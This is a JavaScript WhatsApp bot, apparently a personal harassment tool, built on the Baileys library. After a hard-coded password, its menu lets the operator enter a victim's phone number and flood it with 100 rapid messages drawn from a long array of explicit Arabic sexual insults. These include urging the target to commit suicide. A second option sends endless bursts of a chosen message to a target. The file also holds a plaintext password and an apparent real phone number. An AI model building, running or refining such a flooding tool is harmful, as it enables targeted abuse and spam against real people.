const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    DisconnectReason,
    delay,
    Browsers
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const qrcode = require('qrcode-terminal');
const fs = require('fs');

const AUTH_DIR = 'auth_info';
const PASSWORD = '22Seif333';
const ADMIN_NUMBER = '201226599219';
const ADMIN_JID = ADMIN_NUMBER + '@s.whatsapp.net';

// Data storage (No Database, just memory)
const registeredUsers = new Map();
let totalUsersCount = 0;
let dailyMessageCount = 0;
let lastResetDate = new Date().toDateString();
let botActive = true;
const userState = new Map();
const passwordAttempts = new Map();
const authenticatedUsers = new Set();

// Huge Insults Array from all provided files
const insults = [
    "خد يبن أل شرمؤطة", "ؤلأ يأ هلفؤت رد أنت يألأ", "أشتمني انا حاسس بيك انت مكسسور", "مش عندك أيد يألأ",
    "ؤلأ أيدك في طيزك", "أه صح نسيت أني قطعتلك ايدك", "اه يالا انا قطعت ايدك", "انا حاسس بيك انت مكسسور",
    "انا دوستك يالا مش كان قصدي ادوسك", "خلاص متعيطش يالا", "انت هتعيط ولا ايه", "حد يجيب لي ال عرص دة منديل",
    "انشف يا خول فين ايه", "امك صعبانه عليا اوي", "عماله تعيط ياض", "لا بجد صعبت عليا امك",
    "نفسو مكسوره بقالو يومين ابوك", "الولا دة حد ضربو يعيني 😍", "مش كان قصدي اكسرك", "انت هتعيط من زبي ولا ايه",
    "وديني انت صعبان عليا", "اتلاقيق بتشتمني في سايبر", "والراجل يقولك خلصت يحبيبي", "تقولو ثواني يا عمو هختم الواد دة",
    "اه وديني يالا", "احنا لازم نعملك جمعيه", "عششان تشتري ويب يبني", "ونقبضهالك الاول", "اه وللههي مش هتفهم حاجة خالص",
    "انت ال عبيط يالا صبي ال مجال اهو", "انت يبتاع الواتساب ولا يا واتساب يا معرص", "تعالا امسك حنكش حنكش عيزك يات",
    "تعاله امسكو", "زوبري واقف عليك", "زوبري عاوز خورمك ياض", "بوس زب بابا يخول", "مش هتبوس زوبر ال بابا يالا",
    "انت ميت فاشخ", "مسخره", "مش موجود اصلا", "انت البقالهه في حياتك", "انت مسخره اقسم بالله",
    "لما اكلمك مش تريح زي الحمير كده", "بوس رجلي يالا", "ي الا ي كسمك", "انا هخليك تلحسها",
    "اوي ي حبيب بضاني", "انزل علي رجلك ي خول", "وابلع ريقكك الاول", "ي ابن الفاجرة", "ي حبيب زبي انت",
    "هههههههههههههههههههههههههههههه", "انت عايش", "علشان انا ادوس عليك", "صح ي كسمك", "ولا اية ي كسمك",
    "نفسي ترد شرفك يالا", "شرفك دة", "شرف مايا خليفة", "انت يالا من كتر منا نكتك اوي", "كسك عايز يتغيرلو",
    "جلب ي معرص", "انت عايز جلبة عشرة", "انا بيني بشتمك وانا ماسك السجارة في ايديك وامك علي زبي",
    "انا بيني هدوس علي كرامتك دي جامد", "هخليك تنام تصحي تقول آلفلسـطـيني مخصمني", "انت يلا ي ابن العبيطة رد علي زبي",
    "انت ي ابن الاحبة ازاي جالك قلب تشتم آلفلسـطـيني", "انا هسحب منك لسانك", "انا مش هخليك تكلم تاني يلا",
    "انا المجال دا =انا", "انا=المجال دا", "ي ابن العيبطة ارمي حببتك في حضني", "ارمي اختك تحت بضاني",
    "امك صدرها كلو في بوقي يلا", "يا ديوث ي ابن المعرصة ي كلب البنات", "انا هنا آلفلســطــيني آلكآرف وبــس",
    "انت محدش يعرفك ولا حد بيحبك", "هاتي حد بيحبك كدا ي مكروف", "اكيد مفيش ي اهبل", "انت مكروف ي ابن اللبوة",
    "انت اهبل وعيبط محدش بيحبك يلا", "انت عيل ابن متناكة امك شرموطة ي حمار", "ي كس ي عبيط", "ي معرص ي عبيط",
    "ي شمام ي عبيط", "انت كلب مطيع", "خليك كلب يالا", "بوس رجلي. يخول", "عارف يلا انت", "انت محتاج ناس كتير تسندك يالا",
    "اصل هدوس عليك بجد", "ي ابن الاحبة ي عرص", "ي كلوت ي جربوع", "ي هرش ي معفن", "رد عليا ي زاني", "ي ابن الزواني",
    "هفضل انيك فيك", "لحد امتا ي كسمك", "صح ي عرص ولا اي", "انت سريع فشخ ييعني", "ولواد جمد", "الي مفيش من كسن. اتنين",
    "بص هشتمك حبه روشين بقا", "ولا ي ابن المتناكة", "امك شغاله في شقه دعاره ي ابن الحمارة", "ابوك بيروح يشتغل معاها ويمسك الفوطة",
    "انا ياسطا هدوس علي كرامتك جامد", "انا معدوم الرحمه يلا", "انا معروف عني الافيونة وقناص الهلافيت ي هلفوت",
    "انت كلام كسمك ضعيف لي كدا", "انا كلامي دا سيف", "انا هلعب بيك الكورة", "انا هفضل اهزق في كوسمك ليل نهار",
    "انا يلا مصنع كلام", "كلامي مش بيخلص ابدا", "انا رشاش كلامي مبيفضاش", "انا يلا زي المدرعه الكلمه مني ب اربعة",
    "انا ال بااااشاا با خروف", "انت ال خروف ياض ي كلب", "ي ابن 100تناكة هات طيزك علي زبي", "انا جيت علي كرامتك جامد ياسطا",
    "وطي ياسطا مص في زبي", "هديك جنيه يلا", "متعيطش بقا ي كوسمك", "او اقولك روح عيط لي الناس قولهم آلفلسـطـيني ضربني",
    "انا هنا آلفلسـطـيني يلا وانت هنا خدام ي ابن اللبوة", "انت يلا ي ابن الشرموطة ي ابن المعرصة ي ابن المتناكة",
    "انت اكيد ابوك عويل", "مخلف عيل عويل زيو بموت", "علشان انا روش يلا انا الاسطورة يلا مش هقولك تاني",
    "انت يلا اشرف واحده في عليه كسمك", "ليها بيتاع سبع افلام سكس يلا", "انت مكانك مش هنا", "المجال دا لي البشوات بس",
    "انت بالمنظر دا تروح تموت نفسك", "انتحر ي ابن العبيطة", "انت شكلك بقا وحش نيك يلا", "انما تسد وتمد", "لا هيداس عليك",
    "زي منا م دايس عليك كدة", "وشكلك بتعيط والله", "تاخد منديل يالا", "تمسح دموعك ولا اية", "خسارة فيك المنديل",
    "اقطع التيشيرت بتاعك", "امسح في دموع كسمك", "ي ابن اكبر لبوة في الشرق الاوسط", "انت يلا ضعيف جدا", "انا هشوط ككسمك يلا",
    "هديك بالرجل زي الكلاب يي ابن الكلب", "انت ي طيز المجال ي ابن اكبر طيز في مصر", "وانت لسة زي منت", "عويل في نفسك",
    "بترفعو لس", "انت عايش ليه يكسمك", "اي لزمت كسمك في الحياه", "ولا ي ابن ال متناكة", "مش ناوي ترد يالا",
    "ولا ايه ابني", "انت هتفضل طول عمرك بتخاف مني", "ديمن بتخاف مني", "آلفلسـطـيني آلكآرف رعبك يا عويل",
    "صح ي ابن ال متناكة", "ولا ايه يخول", "انت ودين امي خول", "اه ودين امي", "انت هتفضل خول", "هتعيش واتساب",
    "وتموت واتساب", "صح يابن ال شرموطة", "قول صح ياض ي غبي", "قول ياله يا عبيط", "انت فقير يالا", "انا من انرداا هصرف عليكو",
    "انا كبير ال بيت بتاعكو ياض ي خول", "انا هنا كبيرها يا عويل", "ابوك مات خول", "ابوك مات من زبي",
    "صح يابن ال شرموطة ولا اية", "ولا ياا غباوه رد", "انت ال غبي ياض", "انت ياض يابن ال شرموطة", "ولا ي عرصجي ي ابن ال متناكة",
    "انت عيل ابن ال واتساب يالا", "انا ال بنيكك ديمن", "انا اب بفششخ كسومك علطول", "انا ال بكسحك علطول",
    "انا ال بعلمك ال ادب علطول", "انا الي بأدبك علطول", "انا كبيركم ياض ي خول", "ولا انت مش حد بيحبك",
    "قولي يخول مين بيحبك", "ولا حد يعرفك", "قولي مين يعرفك", "وديني مش حد يعرفك", "انت منتههي خالص يابني",
    "انا نهيتك يابني", "انا خلصت عليك", "انا دبحتك وللهي", "انا بدبح يالا ي فرفور", "انت يالاا مين بيكلمك",
    "قولي يخول مين يعرفك", "متقولي يابني", "مشش بكلم كسسومك ولا ايه", "انت يبني كدة مش نافع", "اجيب بنت تشتم مكانك",
    "ولا افتح عليا كيب ولا فلدر", "انت مش عارف تتكلم", "اكتب كلمه يخربيتك", "هتسيب ال شات فاضي كدة",
    "لم اصور الفديو وارفعو يتيوب", "شركة اليتيوب هتلقيق مش كاتب حاجة", "هتلقيني مكسر الششات", "هيدوني 100 في الــ 100 وهنجح",
    "انما انت هتشيل ملاحق", "شوفت الفرق بنا يابني", "انت يالاا يمكروف", "يلي مفيش حد بيحبك", "كلو كرفك يابني وللهي",
    "انت عمرك م ارتبط يسطا", "هترتبط بي مين انت قولي", "بي شكل كسس امك دة مش هتنفع", "انت وششك بايظ ياض",
    "انا بوظتلك وشك يابن الغبية", "انا نهيتك كسسسسمك هنا", "انا عدمت ال ششرموطة امك", "انا عدمت طيزك يالا",
    "حط طيزك فوق زبي", "حط زبي فوق طيزك", "عسسسل يكسسسمك 😁😁😁"
];

async function startBot() {
    console.log('💀 جاري تشغيل [ المُتحكِّم V6 ] - وضع التدمير الشامل...');
    
    const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS('Desktop'),
        syncFullHistory: false,
        qrTimeout: 60000, // Increase QR timeout to 60 seconds
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 30000
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            console.clear();
            console.log('📸 امسح الـ QR الآن:');
            qrcode.generate(qr, { small: true });
        }
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error instanceof Boom) ? 
                lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut : true;
            if (shouldReconnect) startBot();
        } else if (connection === 'open') {
            console.log('✅ تم الاتصال بنجاح! البوت جاهز للتدمير.');
        }
    });

    sock.ev.on('messages.upsert', async (m) => {
        if (m.type !== 'notify') return;
        const msg = m.messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const jid = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
        const state = userState.get(jid);

        // Authentication
        if (!authenticatedUsers.has(jid)) {
            if (text === PASSWORD) {
                authenticatedUsers.add(jid);
                if (!registeredUsers.has(jid)) registeredUsers.set(jid, { freeRequests: 100, isBanned: false });
                await sock.sendMessage(jid, { text: '✅ تم تسجيل الدخول! أرسل "اوامر" للبدء.' });
            } else {
                await sock.sendMessage(jid, { text: '⚠️ أدخل كلمة المرور:' });
            }
            return;
        }

        if (text === 'اوامر' || text === 'الاوامر') {
            let menu = `💀 قائمة التدمير 💀\n\n1 - تدمير رقم (Spam)\n2 - هجوم لانهائي\n3 - حالة البوت`;
            userState.set(jid, { step: 'menu' });
            await sock.sendMessage(jid, { text: menu });
            return;
        }

        if (state?.step === 'menu') {
            if (text === '1') {
                userState.set(jid, { step: 'destroy_phone' });
                await sock.sendMessage(jid, { text: '😈 أدخل رقم الضحية:' });
            } else if (text === '2') {
                userState.set(jid, { step: 'admin_attack_phone' });
                await sock.sendMessage(jid, { text: '💀 أدخل الرقم للهجوم اللانهائي:' });
            } else if (text === '3') {
                await sock.sendMessage(jid, { text: `🤖 البوت يعمل بنجاح!\nالرسائل المرسلة اليوم: ${dailyMessageCount}` });
            }
            return;
        }

        if (state?.step === 'destroy_phone') {
            const targetPhone = text.replace(/[^\d]/g, '') + '@s.whatsapp.net';
            await sock.sendMessage(jid, { text: `🚀 بدأ التدمير الشامل...` });
            
            // Parallel sending for maximum speed
            const burstSize = 100;
            const promises = Array.from({ length: burstSize }).map(async (_, i) => {
                const insult = insults[Math.floor(Math.random() * insults.length)];
                await delay(i * 50);
                return sock.sendMessage(targetPhone, { text: insult });
            });
            await Promise.all(promises);
            
            await sock.sendMessage(jid, { text: `✅ تم قصف الهدف بـ ${burstSize} رسالة.` });
            userState.set(jid, { step: 'menu' });
            return;
        }

        if (state?.step === 'admin_attack_phone') {
            userState.set(jid, { step: 'admin_attack_msg', targetPhone: text.replace(/[^\d]/g, '') });
            await sock.sendMessage(jid, { text: 'أدخل رسالة الهجوم (أرسل "وقف" للإنهاء):' });
            return;
        }

        if (state?.step === 'admin_attack_msg') {
            if (text === 'وقف') {
                userState.set(jid, { step: 'menu' });
                await sock.sendMessage(jid, { text: '🛑 توقف الهجوم.' });
                return;
            }
            const targetJid = state.targetPhone + '@s.whatsapp.net';
            while (userState.get(jid)?.step === 'admin_attack_msg') {
                const burst = Array.from({ length: 10 }).map(() => sock.sendMessage(targetJid, { text: text }));
                await Promise.all(burst);
                dailyMessageCount += 10;
                await delay(300);
            }
        }
    });
}

startBot().catch(err => console.error(err));
